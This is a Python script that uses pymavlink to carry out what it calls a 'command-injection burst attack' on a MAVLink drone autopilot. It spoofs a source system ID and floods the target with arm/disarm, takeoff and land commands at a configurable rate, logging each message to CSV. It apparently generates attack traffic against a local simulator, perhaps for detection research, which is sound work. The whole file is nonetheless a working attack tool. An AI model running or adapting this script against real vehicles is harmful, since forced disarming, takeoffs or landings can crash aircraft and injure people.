import argparse
import csv
import time
from datetime import datetime, timezone
from pathlib import Path

from pymavlink import mavutil


def build_parser():
    parser = argparse.ArgumentParser(description="Command-injection burst attack.")
    parser.add_argument("--udp", default="127.0.0.1:14550", help="Host:port for udpout.")
    parser.add_argument("--rate", type=float, default=25.0, help="Burst cycles per second.")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to run.")
    parser.add_argument("--out-dir", default=None, help="Output directory for CSV.")
    return parser


def main():
    args = build_parser().parse_args()
    out_dir = Path(args.out_dir) if args.out_dir else Path(__file__).resolve().parents[1] / "out"
    out_dir.mkdir(exist_ok=True)

    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    out_path = out_dir / f"attack_command_injection_burst_{ts}.csv"

    conn = mavutil.mavlink_connection(f"udpout:{args.udp}")
    conn.mav.srcSystem = 241
    conn.mav.srcComponent = 1

    period = 1.0 / max(args.rate, 1.0)
    start = time.time()
    seq = 0

    commands = [
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
    ]

    with out_path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["timestamp", "msg_name", "msg_id", "seq", "command_id"])

        while time.time() - start < args.duration:
            for command_id in commands:
                conn.mav.command_long_send(
                    1,
                    1,
                    command_id,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                )
                writer.writerow([time.time(), "COMMAND_LONG", mavutil.mavlink.MAVLINK_MSG_ID_COMMAND_LONG, seq, command_id])
                seq += 1

            time.sleep(period)


if __name__ == "__main__":
    main()
